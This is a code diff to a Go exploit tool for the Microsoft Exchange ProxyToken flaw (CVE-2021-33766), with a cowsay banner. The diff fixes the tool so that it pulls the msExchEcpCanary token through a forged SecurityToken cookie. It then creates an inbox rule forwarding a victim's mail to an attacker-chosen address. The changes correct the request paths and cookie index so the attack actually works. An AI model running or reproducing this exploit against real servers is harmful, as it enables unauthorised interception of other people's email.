@@ -4,6 +4,7 @@ import (
 	"crypto/tls"
 	"flag"
 	"fmt"
+	"io/ioutil"
 	"net/http"
 	"strings"
 	"time"
@@ -14,7 +15,7 @@ import (
 func Banner() {
 	x := `
 	----------------------
-	< proxytoken is awesome! >
+	< proxytoken (CVE-2021-33766) is awesome! >
 	  ----------------------
 	   \   ^__^
 		\  (oo)\_______
@@ -26,19 +27,6 @@ func Banner() {
 	color.Yellow("%s", y)
 }
 
-func Between(str, starting, ending string) string {
-	s := strings.Index(str, starting)
-	if s < 0 {
-		return ""
-	}
-	s += len(starting)
-	e := strings.Index(str[s:], ending)
-	if e < 0 {
-		return ""
-	}
-	return str[s : s+e]
-}
-
 func splitmsexch(msexch string) string {
 	msexch1 := strings.Split(msexch, "msExchEcpCanary=")
 	msexch2 := msexch1[len(msexch1)-1]
@@ -46,13 +34,6 @@ func splitmsexch(msexch string) string {
 	msexch4 := msexch3[0]
 
 	return msexch4
-}
-
-func splitequal(msexch string) string {
-	msexch1 := strings.Split(msexch, "=")
-	msexch2 := msexch1[0]
-
-	return msexch2
 }
 
 func exploit(target, targetemail, victimemail string) {
@@ -63,7 +44,7 @@ func exploit(target, targetemail, victimemail string) {
 		target = "http://" + target
 	}
 
-	request, err := http.NewRequest(http.MethodGet, target+"/ecp/"+targetemail+"/RulesEditor/InboxRules.svc/Newobject", nil)
+	request, err := http.NewRequest(http.MethodGet, target+"/ecp/"+targetemail+"/PersonalSettings/HomePage.aspx?showhelp=false", nil)
 	if err != nil {
 		fmt.Println(err)
 	}
@@ -86,14 +67,14 @@ func exploit(target, targetemail, victimemail string) {
 		_ = do.Body.Close()
 	}()
 
-	if do.StatusCode == 404 && splitequal(do.Header["Set-Cookie"][0]) == "msExchEcpCanary" {
+	if do.StatusCode == 200 {
 		fmt.Println("[+] req status: " + do.Status)
-		fmt.Println("[+] target Set-Cookie's msExchEcpCanary value is: " + splitmsexch(do.Header["Set-Cookie"][0]))
-		fmt.Println("[+] target is vulnerable to proxytoken !")
+		fmt.Println("[+] target Set-Cookie's msExchEcpCanary value is: " + splitmsexch(do.Header["Set-Cookie"][1]))
+		fmt.Println("[+] target is vulnerable to proxytoken (CVE-2021-33766) !")
 
 		postdata := `{"properties":{"RedirectTo":[{"RawIdentity":"` + targetemail + `","DisplayName":"` + targetemail + `","Address":"` + targetemail + `","AddressOrigin":0,"galContactGuid":null,"RecipientFlag":0,"RoutingType":"SMTP","SMTPAddress":"` + targetemail + `"}],"Name":"Testrule","StopProcessingRules":true}}`
 
-		request1, err := http.NewRequest(http.MethodPost, target+"/ecp/"+victimemail+"RulesEditor/InboxRules.svc/Newobject?msExchEcpCanary="+splitmsexch(do.Header["Set-Cookie"][0]), strings.NewReader(postdata))
+		request1, err := http.NewRequest(http.MethodPost, target+"/ecp/"+victimemail+"/RulesEditor/InboxRules.svc/Newobject?msExchEcpCanary="+splitmsexch(do.Header["Set-Cookie"][1]), strings.NewReader(postdata))
 		if err != nil {
 			fmt.Println(err)
 		}
@@ -106,24 +87,26 @@ func exploit(target, targetemail, victimemail string) {
 		request1.Header.Add("Cookie", "SecurityToken=x")
 		request1.Header.Add("Content-Type", "application/json; charset=utf-8")
 
+		fmt.Println("[+] adding redirect rule from " + victimemail + " to " + targetemail)
 		do1, err := cli.Do(request1)
 		if err != nil {
 			fmt.Println("[-] requesting err...")
 			return
 		}
+
 		if do1.StatusCode == 200 {
 			fmt.Println("[+] req status: " + do1.Status)
-			fmt.Println("[+] target Set-Cookie's msExchEcpCanary value is: " + splitmsexch(do.Header["Set-Cookie"][0]))
+			s, _ := ioutil.ReadAll(do1.Body)
+			fmt.Println("[+] the rule adding response text: " + string(s))
+			fmt.Println("[+] target Set-Cookie's msExchEcpCanary value is: " + splitmsexch(do.Header["Set-Cookie"][1]))
 			fmt.Println("[+] set email redirection rule successed !")
 		} else {
 			fmt.Println("[-] req status: " + do1.Status)
-			fmt.Println("[-] target Set-Cookie value is: " + splitequal(do.Header["Set-Cookie"][0]))
 			fmt.Println("[-] set email redirection rule failed !")
 		}
 	} else {
 		fmt.Println("[-] req status: " + do.Status)
-		fmt.Println("[-] target Set-Cookie value is: " + splitequal(do.Header["Set-Cookie"][0]))
-		fmt.Println("[-] target is not vulnerable to proxytoken !")
+		fmt.Println("[-] target is not vulnerable to proxytoken (CVE-2021-33766) !")
 	}
 }
 
